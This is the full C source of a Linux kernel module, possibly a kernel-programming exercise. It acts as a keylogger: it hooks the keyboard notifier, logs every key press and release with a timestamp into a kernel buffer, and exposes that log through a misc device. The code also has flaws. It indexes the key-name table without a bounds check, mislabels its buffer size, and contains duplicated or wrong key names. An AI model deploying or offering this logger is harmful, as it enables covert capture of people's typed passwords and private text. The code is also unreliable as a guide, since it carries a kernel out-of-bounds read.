#include <linux/module.h>
#include <linux/init.h>
#include <linux/miscdevice.h>
#include <linux/fs.h>
#include <linux/keyboard.h>
#include <linux/uaccess.h>
#include <linux/ktime.h>
#include <linux/input.h>

#define BUF_SIZE 4096 /* 16 Kb */

typedef struct {
    const char *name;
} KeyMap;

KeyMap key_table[] = {
    [0] = {"Reserved"},
    [1] = {"Esc"},
    [2] = {"1"},
    [3] = {"2"},
    [4] = {"3"},
    [5] = {"4"},
    [6] = {"5"},
    [7] = {"6"},
    [8] = {"7"},
    [9] = {"8"},
    [10] = {"9"},
    [11] = {"0"},
    [12] = {"Minus"},
    [13] = {"Equal"},
    [14] = {"Backspace"},
    [15] = {"Tab"},
    [16] = {"Q"},
    [17] = {"W"},
    [18] = {"E"},
    [19] = {"R"},
    [20] = {"T"},
    [21] = {"Y"},
    [22] = {"U"},
    [23] = {"I"},
    [24] = {"O"},
    [25] = {"P"},
    [26] = {"Left Brace"},
    [27] = {"Right Brace"},
    [28] = {"Enter"},
    [29] = {"Left Ctrl"},
    [30] = {"A"},
    [31] = {"S"},
    [32] = {"D"},
    [33] = {"F"},
    [34] = {"G"},
    [35] = {"H"},
    [36] = {"J"},
    [37] = {"K"},
    [38] = {"L"},
    [39] = {"Semicolon"},
    [40] = {"Apostrophe"},
    [41] = {"Grave"},
    [42] = {"Left Shift"},
    [43] = {"Backslash"},
    [44] = {"Z"},
    [45] = {"X"},
    [46] = {"C"},
    [47] = {"V"},
    [48] = {"B"},
    [49] = {"N"},
    [50] = {"M"},
    [51] = {"Comma"},
    [52] = {"Dot"},
    [53] = {"Slash"},
    [54] = {"Right Shift"},
    [55] = {"Keypad *"},
    [56] = {"Left Alt"},
    [57] = {"Space"},
    [58] = {"Caps Lock"},
    [59] = {"F1"},
    [60] = {"F2"},
    [61] = {"F3"},
    [62] = {"F4"},
    [63] = {"F5"},
    [64] = {"F6"},
    [65] = {"F7"},
    [66] = {"F8"},
    [67] = {"F9"},
    [68] = {"F10"},
    [69] = {"Num Lock"},
    [70] = {"F14"},
    [71] = {"Keypad 7"},
    [72] = {"Keypad 8"},
    [73] = {"Keypad 9"},
    [74] = {"Keypad -"},
    [75] = {"Keypad 4"},
    [76] = {"Keypad 5"},
    [77] = {"Keypad 6"},
    [78] = {"Keypad +"},
    [79] = {"Keypad 1"},
    [80] = {"Keypad 2"},
    [81] = {"Keypad 3"},
    [82] = {"Keypad 0"},
    [83] = {"Keypad Dot"},
    [84] = {"Unknown"},
    [85] = {"F11"},
    [86] = {"F12"},
    [87 ... 90] = {"Reserved"},
    [91] = {"Keypad Enter"},
    [92] = {"Right Ctrl"},
    [93] = {"Keypad /"},
    [94] = {"Right Alt"},
    [95] = {"Home"},
    [96] = {"Keypad Enter"},
    [97] = {"Page Up"},
    [98] = {"Keypad /"},
    [99] = {"F13"},
    [100] = {"Right Alt"},
    [101] = {"Arrow Down"},
    [102] = {"Home"},
    [103] = {"Arrow up"},
    [104] = {"Page up"},
    [105] = {"Arrow Left"},
    [106] = {"Arrow Right"},
    [107] = {"End"},
    [108] = {"Arrow Down"},
    [109] = {"Page Down"},
    [110] = {"Insert"},    
    [111] = {"Delete"},
    [112] = {"Keypad Equal"},
    [113 ... 119] = {"Reserved"},
    [119] = {"F15"},
    [120 ... 124] = {"Reserved"},
    [125] = {"Command Left"},
    [126] = {"Command Right"},
    [127] = {"Menu"},
    [128 ... 255] = {"Reserved"},
};


static char log_buffer[BUF_SIZE];
static size_t log_index = 0;
static DEFINE_MUTEX(log_lock);

static int key_event_notifier(struct notifier_block *nb, unsigned long action, void *data);
static ssize_t keyboard_read(struct file *file, char __user *buf, size_t count, loff_t *ppos);

static struct notifier_block nb = {
    .notifier_call = key_event_notifier,
};

static const struct file_operations fops = {
    .owner = THIS_MODULE,
    .read = keyboard_read,
};

static struct miscdevice keyboard_misc_device = {
    .minor = MISC_DYNAMIC_MINOR,
    .name = "module_keyboard",
    .fops = &fops,
};

static int key_event_notifier(struct notifier_block *nb, unsigned long action, void *data)
{
    struct keyboard_notifier_param *param = data;
    char entry[128];
    int len;
    static unsigned int last_keycode = 0;
    static int last_keydown = -1;

    if (action == KBD_KEYCODE)
    {
        struct timespec64 ts;
        struct tm tm;

        ktime_get_real_ts64(&ts);
        time64_to_tm(ts.tv_sec, 0, &tm);

        len = snprintf(entry, sizeof(entry), "%02d:%02d:%02d: %s (%u) %s\n",
                       tm.tm_hour, tm.tm_min, tm.tm_sec, key_table[param->value].name,\
                       param->value, param->down ? "Pressed" : "Released");

        mutex_lock(&log_lock);
        /* MUST be into the mutex otherwise datarace condition may appear. 
         * consider if it's better locking it on top and just checking it that must be attomic
         * or locking it here.
         */
        if (param->down == last_keydown && param->value == last_keycode)
        {
            mutex_unlock(&log_lock);

            return NOTIFY_OK;
        }

        last_keycode = param->value;
        last_keydown = param->down;

        if (log_index + len < BUF_SIZE)
        {
            memcpy(log_buffer + log_index, entry, len);
            log_index += len;
        }
        mutex_unlock(&log_lock);
    }
    return NOTIFY_OK;
}

static ssize_t keyboard_read(struct file *file, char __user *buf, size_t count, loff_t *ppos)
{
    ssize_t ret;

    mutex_lock(&log_lock);
    if (*ppos >= log_index)
    {
        ret = 0;
    }
    else
    {
        ret = min(count, log_index - *ppos);
        if (copy_to_user(buf, log_buffer + *ppos, ret))
            ret = -EFAULT;
        else
            *ppos += ret;
    }
    mutex_unlock(&log_lock);

    return ret;
}

static int __init keyboard_init(void)
{
    int ret;

    ret = misc_register(&keyboard_misc_device);
    if (ret)
        return ret;

    ret = register_keyboard_notifier(&nb);
    if (ret)
        misc_deregister(&keyboard_misc_device);

    return ret;
}

static void __exit keyboard_exit(void)
{
    unregister_keyboard_notifier(&nb);
    misc_deregister(&keyboard_misc_device);
}

module_init(keyboard_init);
module_exit(keyboard_exit);

MODULE_LICENSE("GPL");
